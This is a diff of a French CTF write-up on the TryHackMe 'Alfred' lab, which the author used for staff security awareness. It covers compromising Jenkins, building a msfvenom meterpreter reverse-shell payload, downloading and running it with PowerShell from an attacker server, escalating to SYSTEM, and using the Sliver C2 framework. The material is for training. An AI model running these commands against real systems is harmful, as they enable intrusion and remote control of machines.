@@ -16,7 +16,7 @@ authors:
 Au travers deAu travers de la plateforme `Tryhackme` je vais vous faire part de ma résolution de la boxe **Alfred**. J'ai effectué la résolution de celle-ci devant plusieurs collaborateurs, dans le but de les sensibiliser aux problématiques de cybersécurité lors du cyber mois.
 {{< /lead >}}
 
-#Informations
+# Informations
 Jenkins est un outil d'automatisation open source, principalement utilisé pour l'intégration continue et la livraison continue (CI/CD). 
 
 Port par défaut :
@@ -26,8 +26,8 @@ Jenkins utilise par défaut le port *8080* pour les communications HTTP. Vous po
 
 Jenkins est un outil puissant qui peut être configuré de nombreuses façons pour répondre aux besoins spécifiques de processus de développement logiciel.
 
-# Partie reconnaissance
-Début de la phase de reconnaissance par l’outil nmap, explication nmap + arguments.
+# Reconnaissance
+Début de la phase de reconnaissance par l’outil nmap. Nmap permet de scanner les ports ouverts, les services actifs et les versions de logiciels.
 ```shell
 nmap -v -A -F -T4 -Pn 10.10.146.136
 
@@ -64,12 +64,12 @@ Un petit tour sur l’ip
 
 
 
-# Acces initial
+# Accès Initial via Jenkins
 On atterri sur Jenkins qui est un outil d'automatisation open source, principalement utilisé pour l'intégration continue et la livraison continue (CI/CD).
 
 ip:8080/
 
-
+L’interface nécessite un login/mot de passe. Des tentatives de brute-force ont été réalisées via Burp Suite et un dictionnaire top 20.
 
 Burp Proxy à régler dans le navigateur
 Intercepte les requêtes web
@@ -118,9 +118,10 @@ Lecture du fichier
 cat C:\Users\bruce\Desktop\user.txt
 ```
 
-# Changement de shell
+# Reverse Shell et Switching Shell
 Sur la machine d’attaque, création de la payload est utilisé dans divers contextes techniques pour désigner les données effectives transmises dans une communication, en excluant les en-têtes, métadonnées, ou autres informations de contrôle. Nous permettant de récupérer la console meterpreter.Parler de l'obfuscation port 80/443 par rapport à un autre.
 
+Génération de la payload.
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.37.61 LPORT=443 -f exe -o filouterie.exe
 ```
@@ -130,12 +131,12 @@ Lancement du serveur python qui permettra de récupérer le binaire.
 python3 -m http.server
 ```
 
-Récupérer la payload sur la machine  jenkins.
+Récupération de la payload sur la machine  jenkins.
 ```powershell
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.37.61:8000/filouterie.exe','filouterie.exe')"
 ```
 
-De nouveau sur la machine d’attaque, dans Metasploit configuration de la payload et run.
+De nouveau sur la machine d’attaque, dans Metasploit, on va faire la configuration de la payload et la run.
 ```shell
 msfupdate
 msfconsole
@@ -150,14 +151,16 @@ Sur Jenkins, exécution de la payload.
 ```Powershell
 Start-Process "filouterie.exe"
 ```
-Ou via jenkins si marche pas, il faut mettre projet/xx.exe
+Ou via jenkins si cela ne marche pas, il faut mettre projet/xx.exe
 ```powershell
 start filouterie.exe
 ```
 
 
 
-#Elevation de privilieges
+# Escalade de Privilèges
+
+Après obtention d’une session Meterpreter, l’objectif est de passer de user à NT AUTHORITY\SYSTEM
 
 ```shell
 whoami /priv
@@ -220,7 +223,7 @@ dff0f748678f280250f25a45b8046b4a
 ```
 User
 
-# 🦧Sliver
+# 🦧Post-Exploitation avec Sliver
 Server de commande and control explication
 
 Un serveur de commande et de contrôle (C&C) est un composant essentiel dans l'infrastructure des cyberattaques, notamment celles impliquant des botnets, des chevaux de Troie, des ransomwares et d'autres types de logiciels malveillants. On va pouvoir stocker les informations de machines compromises pour lancer en masses des commandes par exemple, ou venir à plusieurs attaquants sur le serveur pour effectuer plusieurs manipulations en même temps.
@@ -283,9 +286,8 @@ Interactive
 Use id
 ```
 
-Shell pour Linux
 
-#shell windows
+Interractions en shell windows (machine infecte)
 ```shell
 shell --no-pty --shell-path c:\\windows\\system32\\cmd.exe
 
@@ -296,3 +298,9 @@ getsystem
 
 Bleu c’est beacon rouge c’est interactif
 
+
+# Conclusion
+
+Ce PoC démontre qu’un simple Jenkins mal configuré peut ouvrir la voie à une compromission forte d’un système d'information. L’utilisation combinée de Metasploit et Sliver illustre bien les différentes phases d’une attaque offensive.
+
+Le projet Alfredde de THM, a joué le rôle d’assistant interactif et pédagogique pour la démonstration aux collaborateurs.
